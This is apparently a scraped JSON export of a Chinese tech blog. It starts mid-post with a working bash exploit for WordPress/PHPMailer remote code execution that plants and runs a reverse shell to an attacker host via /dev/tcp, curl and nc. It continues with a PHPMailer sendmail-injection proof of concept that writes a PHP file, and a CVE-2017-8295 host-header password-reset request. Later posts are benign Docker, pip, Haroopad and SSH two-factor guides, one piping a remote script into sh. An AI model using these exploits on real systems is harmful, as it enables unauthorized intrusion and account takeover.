QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;intro2=&quot;ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtbMG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBEaXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAgICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJpbGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;echo &quot;$intro&quot; | base64 -decho &quot;$intro2&quot; | base64 -dif [ &quot;$#&quot; -ne 1 ]; thenecho -e &quot;Usage:\\n$0 target-wordpress-url\\n&quot;exit 1fitarget=&quot;$1&quot;echo -ne &quot;\\e[91m[*]\\033[0m&quot;read -p &quot; Sure you want to get a shell on the target &apos;$target&apos; ? [y/N] &quot; choiceechoif [ &quot;$choice&quot; == &quot;y&quot; ]; thenecho -e &quot;\\e[92m[*]\\033[0m Guess I can&apos;t argue with that... Let&apos;s get started...\\n&quot;echo -e &quot;\\e[92m[+]\\033[0m Connected to the target&quot;# Serve payload/bash script on :80RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;echo &quot;$RCE_exec_cmd&quot; &gt; rce.txtpython -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;hpid=$!# Save payload on the target in /tmp/rcecmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -s -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpasswordecho -e &quot;\\n\\e[92m[+]\\e[0m Payload sent successfully&quot;# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rcecmd=&quot;/bin/bash /tmp/rce&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword &amp;echo -e &quot;\\n\\e[92m[+]\\033[0m Payload executed!&quot;echo -e &quot;\\n\\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m...\\n&quot;nc -vv -l 1337echoelseecho -e &quot;\\e[92m[+]\\033[0m Responsible choice ;) Exiting.\\n&quot;exit 0fiecho &quot;Exiting...&quot;exit 0 上述另外一个最新曝出编号为CVE-2017-8295的漏洞，严重程度被评级为介于Medium和High之间（而非Critical），影响到WordPress Core &lt;= 4.7.4以下的版本。 这个漏洞的概况是这样的：WordPress有个密码重置功能，该特性中存在漏洞——在某些情况下可能导致攻击者在无需身份认证的情况下拿到密码重置链接，这样一来攻击者就能获取目标用户的WordPress账户了。 这个漏洞源于WordPress默认在创建密码重置邮件的时候，采用不受信任的数据。具体的利用方式点击这里查看。目前WordPress官方暂无针对该问题的解决方案，可以采用如下临时解决方案： 用户可启用UserCanonicalName实施静态SERVER_NAME值 https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname 据作者所说，该问题已经向WordPress安全团队进行过多次反馈，最早一次是在去年7月份，但一直没有得到相应的反馈。 【2016.12.27原文】 这次曝出远程代码执行漏洞的是堪称全球最流行邮件发送类的PHPMailer，据说其全球范围内的用户量大约有900万——每天还在持续增多。 GitHub上面形容PHPMailer“可能是全球PHP发送邮件最流行的代码。亦被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等”。所以这个漏洞影响范围还是比较广的，漏洞级别也为Critical最高级。 漏洞编码 CVE-2016-10033 影响版本 PHPMailer &lt; 5.2.18 漏洞级别 高危 漏洞描述 独立研究人员Dawid Golunski发现了该漏洞——远程攻击者利用该漏洞，可实现远程任意代码在web服务器账户环境中执行，并使web应用陷入威胁中。攻击者主要在常见的web表单如意见反馈表单，注册表单，邮件密码重置表单等使用邮件发送的组件时利用此漏洞。 不过有关该漏洞的细节信息，研究人员并未披露，期望给予网站管理员更多的时间来升级PHPMailer类，避免受漏洞影响。 漏洞PoC 实际上Dawid Golunski已经做了个可行的RCE PoC，不过会迟一些再发布。关注视频PoC请点击：https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html 更新：PoC代码已经公布，请站长们尽快升级！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344更新：PoC代码已经公布，请站长们尽快升级！&lt;?php /* PHPMailer &lt; 5.2.18 Remote Code Execution (CVE-2016-10033) A simple PoC (working on Sendmail MTA) It will inject the following parameters to sendmail command: Arg no. 0 == [/usr/sbin/sendmail] Arg no. 1 == [-t] Arg no. 2 == [-i] Arg no. 3 == [-fattacker\\] Arg no. 4 == [-oQ/tmp/] Arg no. 5 == [-X/var/www/cache/phpcode.php] Arg no. 6 == [some&quot;@email.com] which will write the transfer log (-X) into /var/www/cache/phpcode.php file. The resulting file will contain the payload passed in the body of the msg: 09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306 09607 &lt;&lt;&lt; Content-Type: text/html; charset=us-ascii 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306-- See the full advisory URL for details. */ // Attacker&apos;s input coming from untrusted source such as $_GET , $_POST etc. // For example from a Contact form $email_from = &apos;&quot;attacker\\&quot; -oQ/tmp/ -X/var/www/cache/phpcode.php some&quot;@email.com&apos;; $msg_body = &quot;&lt;?php phpinfo(); ?&gt;&quot;; // ------------------ // mail() param injection via the vulnerability in PHPMailer require_once(&apos;class.phpmailer.php&apos;); $mail = new PHPMailer(); // defaults to using php &quot;mail()&quot; $mail-&gt;SetFrom($email_from, &apos;Client Name&apos;); $address = &quot;customer_feedback@company-X.com&quot;; $mail-&gt;AddAddress($address, &quot;Some User&quot;); $mail-&gt;Subject = &quot;PHPMailer PoC Exploit CVE-2016-10033&quot;; $mail-&gt;MsgHTML($msg_body); if(!$mail-&gt;Send()) &#123; echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo; &#125; else &#123; echo &quot;Message sent!\\n&quot;; &#125; 漏洞修复 更新到5.2.18：https://github.com/PHPMailer/PHPMailer 漏洞详情目前已经提交给了PHPMailer官方——官方也已经发布了PHPMailer 5.2.18紧急安全修复，解决上述问题，受影响的用户应当立即升级。详情可参见： https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md *本文转自FreeBuf.COM","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://blog.unixmen.cn/tags/WordPress/"}]},{"title":"WordPress爆未经授权的密码重置漏洞","slug":"WordPress爆未经授权的密码重置漏洞","date":"2017-05-05T01:14:35.000Z","updated":"2017-05-05T01:28:24.000Z","comments":true,"path":"2017/05/05/WordPress爆未经授权的密码重置漏洞/","link":"","permalink":"http://blog.unixmen.cn/2017/05/05/WordPress爆未经授权的密码重置漏洞/","excerpt":"","text":"漏洞提交者：Dawid Golunski漏洞编号：CVE-2017-8295发布日期：2017-05-03修订版本：1.0漏洞危害：中/高 I. 漏洞WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day) II. 背景WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。 III. 介绍WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。 IV. 描述该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头 1234567891011121314------[ wp-includes/pluggable.php ]------if ( !isset( $from_email ) ) &#123; // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER[&apos;SERVER_NAME&apos;] ); if ( substr( $sitename, 0, 4 ) == &apos;www.&apos; ) &#123; $sitename = substr( $sitename, 4 ); &#125; $from_email = &apos;wordpress@&apos; . $sitename;&#125;----------------------------------------- 正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（参考Apache文档）由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com这将导致Wordpress的$from_email变为wordpress@attackers-mxserver.com，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（参考PHP文档）基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。 攻击场景：如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）某些自动回复可能会附加有邮件发送副本发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。 V. POC 如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost):12345678-----[ HTTP Request ]----POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1Host: injected-attackers-mxserver.comContent-Type: application/x-www-form-urlencodedContent-Length: 56user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password WordPress将触发管理员账户的密码重置功能由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail12345678910------[ resulting e-mail ]-----Subject: [CompanyX WP] Password ResetReturn-Path: &lt;wordpress@attackers-mxserver.com&gt;From: WordPress &lt;wordpress@attackers-mxserver.com&gt;Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;X-Priority: 3MIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit 有人请求将以下账户的密码进行重置：12http://companyX-wp/wp/wordpress/Username: admin 如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址：1http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E 正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域通过bash脚本替换/usr/sbin/sendmail以执行头的验证：12#!/bin/bashcat &gt; /tmp/outgoing-email VI. 业务影响在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。 VII. 系统影响WordPress至最新版本4.7.4全部受影响 VIII. 解决方案目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（参考Apache） IX. 参考文献https://legalhackers.com https://ExploitBox.io Vendor site: https://wordpress.org http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname http://php.net/manual/en/function.mail.php https://tools.ietf.org/html/rfc5321 转自FreeBuf.com","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://blog.unixmen.cn/tags/WordPress/"}]},{"title":"Docker私有镜像仓库节点部署","slug":"Docker私有镜像仓库节点部署","date":"2017-05-02T09:42:29.000Z","updated":"2017-05-02T10:00:19.000Z","comments":true,"path":"2017/05/02/Docker私有镜像仓库节点部署/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/Docker私有镜像仓库节点部署/","excerpt":"","text":"关于本文本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。 硬件要求生产环境中要安装或升级容器私有镜像仓库节点，需要硬件必须满足下列要求： 最小 推荐 备注 CPU 1 core 大于4 core 内存 1 GB 大于32 GB 磁盘 5 GB 大于120 GB 小于 5GB 仍然可以安装，Docker 对磁盘需求较大，要确保 Docker 的 Graph Dir(/var/lib/docker) 在较大磁盘分区上 独立数据盘 RHEL/CentOS 需要 &gt; 5GB 独立数据盘 RHEL/CentOS 需要 &gt;30GB 独立数据盘 需要使用 devicemapper 的 direct-lvm 模式 网络 所有节点互通 所有节点互通, ping &lt;1ms 至少两块网卡 ##系统要求 系统推荐：CentOS 7.2 内核推荐：大于3.10 注：默认第一块网卡为内网 时间同步 安装ntpd服务 1yum install ntp 与上游ntp服务器进行时间同步 1ntpdate 10.154.88.88 配置ntp服务配置文件 1sed -i &apos;s/0.centos.pool.ntp.org iburst/10.154.88.88/g&apos; /etc/ntp.conf 启动ntpd服务 12systemctl enable ntpdsystemctl start ntpd 配置本地存储为方便后期维护管理，采用LVM对本地存储进行管理 创建PV 1pvcreate /dev/sdb 创建VG 1vgcreate data /dev/sdb 创建LV 1lvcreate -L 500G data -n docker_data 格式化新分区 1mkfs.xft /dev/data/docker_data ##系统更新 为了提供更稳定的基础环境，建议对宿主机的底层环境进行更新升级。1yum update -y ##安装容器服务 卸载系统默认（版本较老的）Docker环境包 12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 配置官方软件仓库源 12yum install -y yum-utilsyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 更新本地缓存 1yum makecache fast 查看软件包信息 1yum list docker-ce.x86_64 --showduplicates |sort -r 安装Docker engine社区版 1yum -y install docker-ce 本地容器服务配置 启动容器服务 1systemctl start docker 设置开机启动 1systemctl enable docker 设置容器数据存储路径 12345systemctl stop dockermv /var/lib/docker&#123;,.bak&#125;mkdir /var/lib/dockermount /dev/data/docker_data /var/lib/dockerecho &quot;/dev/data/docker_data /var/lib/docker xfs defaults 1 0&quot; &gt;&gt;/etc/fstab 配置加速器 1curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxxxx.m.daocloud.io 启动容器服务 1systemctl start docker 测试运行实例 1docker run hello-world 创建私有镜像仓库镜像存放分区 创建LV 1lvcreate -L 2000G data -n registry_data 格式化新分区 1mkfs.xft /dev/data/registry_data 挂载新分区 1mount /dev/data/registry_data /data/docker/registry/ 修改系统启动挂载分区 1echo &quot;/dev/data/registry_data /data/registry_data xfs defaults 1 0&quot; &gt;&gt;/etc/fstab 启动私有镜像仓库registry 是Docker官方提供的私有镜像仓库工具，可以用于构建私有的镜像仓库 1docker run -d -p 5000:5000 -v /data/docker/registry/:/var/lib/registry registry:latest 私有镜像仓库测试 查看本地镜像1234[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEbusybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 可以看到，本机共有两个容器镜像，分别是：registry和busybox 重新标记一个本地镜像为私有仓库的版本，这里将本地的busybox标记为本地IP:5000/busybox 1docker tag busybox 10.82.2.103:5000/busybox 再次查看本地镜像再次查看镜像可以看到多了一个标记为10.82.2.103:5000/busybox的镜像 12345[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 2 weeks ago 1.11 MBbusybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 将本地镜像推送到本地仓库中 1docker push 10.82.2.103:5000/busybox 推送过程 1234[root@docker-registry ~]# docker push 10.82.2.103:5000/busyboxThe push refers to a repository [10.82.2.103:5000/busybox]c0de73ac9968: Pushed latest: digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5 size: 527 查看本地仓库中的镜像列表 1curl 10.82.2.103:5000/v2/busybox/tags/list 结果如下：1&#123;&quot;name&quot;:&quot;busybox&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125; 删除本地busybox镜像 1234567[root@docker-registry ~]# docker rmi busyboxUntagged: busybox:latestUntagged: busybox@sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 从私有仓库拉取镜像 12345[root@docker-registry ~]# docker pull 10.82.2.103:5000/busyboxUsing default tag: latestlatest: Pulling from busyboxDigest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5Status: Image is up to date for 10.82.2.103:5000/busybox:latest 可以看到成功获取私有仓库中的镜像 尝试从私有镜像仓库中拉取的镜像启动容器 123456[root@docker-registry ~]# docker run -i -t 10.82.2.103:5000/busybox / # hostname 11ea9195246f/ # hostid 11ac0300/ # 在其他容器计算节点上进行测试测试内容包括：拉取私有镜像仓库中的镜像、在容器计算节点上查看所拉取的镜像、从私有镜像仓库中拉取的镜像启动容器。 拉取私有镜像仓库中的镜像 123456[I] $ docker pull 10.82.2.103:5000/busyboxUsing default tag: latestlatest: Pulling from busybox04176c8b224a: Pull complete Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5Status: Downloaded newer image for 10.82.2.103:5000/busybox:latest 查看拉取的镜像 123456789[I] $ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 13 days ago 1.11 MBubuntu latest 4ca3a192ff2a 3 months ago 128.2 MBcentos latest 0584b3d2cf6d 4 months ago 196.5 MBregistry latest c9bd19d022f6 5 months ago 33.27 MB[I] $ sudo ip add |grep 192 inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25 inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0 从私有镜像仓库中拉取的镜像启动容器 12345678[I] $ sudo ip add |grep 192 inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25 inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0[I] $ docker run -i -t 10.82.2.103:5000/busybox/ # hostname &amp;&amp;hostid4ed4430a0b8d11ac0200/ # 可以看到可以正常启动容器 至此，私有镜像仓库部署完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"},{"name":"Docker私有仓库","slug":"技术文档/Tools/容器/Docker私有仓库","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/Docker私有仓库/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器私有仓库配置","slug":"容器私有仓库配置","permalink":"http://blog.unixmen.cn/tags/容器私有仓库配置/"},{"name":"Docker私有仓库","slug":"Docker私有仓库","permalink":"http://blog.unixmen.cn/tags/Docker私有仓库/"}]},{"title":"Fedora安装Haroopad","slug":"Fedora安装Haroopad","date":"2017-05-02T08:59:14.000Z","updated":"2017-05-02T10:08:43.000Z","comments":true,"path":"2017/05/02/Fedora安装Haroopad/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/Fedora安装Haroopad/","excerpt":"","text":"简介Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下可载官方打包好的deb软件，通过包命令可以安装。然而在其他Linux系列版本下并没有对应的软件包，所以需要下载源码包进行安装；值得一提的是，Haroopad在所有平台下都区分32/64位版本。 介绍安装环境我的Fedora版本是23，Haroopad版本是0.13.1 64位（这也是截至今天最新的稳定版本）。 下载源码安装包：官方下载地址为： 1https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz 安装 将下载的软件包解压： 1tar -zxvf haroopad-v0.13.1-x64.tar.gz 再将解压出来的软件包解压： 1tar -zxvf data.tar.gz 将解压出来的文件复制到根目录 1cp -rv ./usr / 将另一个软件包也解压出来 1tar -zxvf control.tar.gz 将从control.tar.gz 中解压出来的文件添加可行权限 1chmod 755 postinst 运行postinst 1./postinst 创建“.desktop” 文件使用以下命令创建“.desktop” 文件 12345678910111213cat &gt;/usr/share/applications/Haroopad.desktop&lt;&lt;EOF[Desktop Entry]Name=haroopadVersion=0.13.1Exec=haroopadComment=The Next Document processor based on MarkdownIcon=haroopadType=ApplicationTerminal=falseStartupNotify=trueEncoding=UTF-8Categories=Development;GTK;GNOME;EOF 复制Hroopad 图标文件：1cp -rf usr/share/icons/hicolor/ /usr/share/icons/hicolor 至此Hroopad安装完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"Haroopad","slug":"技术文档/Tools/Haroopad","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Haroopad/"}],"tags":[{"name":"Haroopad","slug":"Haroopad","permalink":"http://blog.unixmen.cn/tags/Haroopad/"},{"name":"标记语言","slug":"标记语言","permalink":"http://blog.unixmen.cn/tags/标记语言/"}]},{"title":"如何在Fedora中安装pip2或pip3","slug":"如何在Fedora中安装pip2或pip3","date":"2017-05-02T03:24:19.000Z","updated":"2017-05-02T10:11:04.000Z","comments":true,"path":"2017/05/02/如何在Fedora中安装pip2或pip3/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/","excerpt":"","text":"文章简介pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。 安装pip 首先我们清空我们系统中残留冗余包。 1dnf clean all 作为最佳体验，我们升级系统软件包 1dnf update -y 现在可以安装pip工具包了pip2使用以下命令进行安装：1dnf -y install python-pip 也可以通过以下方式进行安装1python -m pip install -U pip pip3使用以下命令进行安装：1dnf -y install python3-pip 也可以通过以下方式进行安装1python3 -m pip install -U pip 验证：pip安装完成后，我们可以进行验证是否正确了安装成功，具体操作如下： 首先可以获取帮助文档 如果仅仅pip2或着pip3可以通过以下命令进行验证： 1pip --help 假如系统中同时安装了pip2和pip3 就要制定pip命令版本进行验证： 如查看pip3的帮助文档： 1pip3 --help 查看pip3的帮助文档 1pip2 --help 其次还可以获取版本信息： pip2 1pip2 -V pip3 1pip3 -V 你pip -V 命令将获取类似如下结果： 1pip 9.0.1 from /usr/lib/python2.7/site-packages (python 2.7)","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"Python","slug":"技术文档/Tools/Python","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Python/"},{"name":"pip","slug":"技术文档/Tools/Python/pip","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Python/pip/"}],"tags":[{"name":"pip","slug":"pip","permalink":"http://blog.unixmen.cn/tags/pip/"},{"name":"python","slug":"python","permalink":"http://blog.unixmen.cn/tags/python/"}]},{"title":"SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证","slug":"通过运维密码实现Linux系统SSH双因子认证","date":"2017-03-29T00:38:24.000Z","updated":"2017-03-29T03:21:56.000Z","comments":true,"path":"2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","excerpt":"","text":"通过运维密码实现Linux系统SSH双因子认证关于本文本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”Google Authenticator“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。 前言/背景近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。 双因子认证 什么是双因子认证 双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。 在这种多重认证的系统中，用户需要通过两种不同的认证程序： 提供他们知道的信息（如 用户名/密码） 再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码） SSH双因子认证实现思路使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。 关于Google 身份验证器 为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器Google Authenticator，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。 关于运维密码 Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。 如何开始首先我们需要一些准备工作： 一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机 一台能运行微信的智能手机 一台支持SSH登陆的终端 在 Linux 系统中安装 Google 身份验证器第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。 用安装包安装 Google 身份验证器如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。 在 Ubuntu 上安装 Google 身份验证器： 12sudo apt-get install libpam-google-authenticator 在 Fedora 上安装 Google 身份验证器： 12sudo dnf install google-authenticator 在 CentOS 上安装 Google 身份验证器： 在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令： 12sudo yum install google-authenticator 编译安装 Google 身份验证器首先，安装构建 Google 身份验证器所需的软件包。 在 Debian、 Ubuntu 或 Linux Mint 上： 12sudo apt-get install wget make gcc libpam0g-dev 在 CentOS、 Fedora 或 RHEL上： 12sudo yum install wget make gcc pam-devel 然后下载 Google 身份验证器的源代码 12git clone https://github.com/google/google-authenticator.git 编译安装Google 身份验证器： 12345678cd google-authenticator/libpam./bootstrap.sh./configuremake 如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。 最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示： 12sudo make install 至此，Google 身份验证器安装完成。 配置Google 身份验证器及运维密码完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。 配置google-authenticator及生成验证密钥 使用（以下）命令生成验证密钥 12google-authenticator 生成验证密钥的时候，会再次确认信息。 12Do you want authentication tokens to be time-based (y/n) 意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y 输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。 紧急验证码在生成密钥的同时还生成了5个8位的紧急密码，当然，也是一次性使用的，请妥善保存，以备不时之需。 保存Google Authenticator配置文件 Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存： 意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？ 12Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n) 输入y回车 禁止同一令牌多用途登陆 意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。 123456 Do you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it 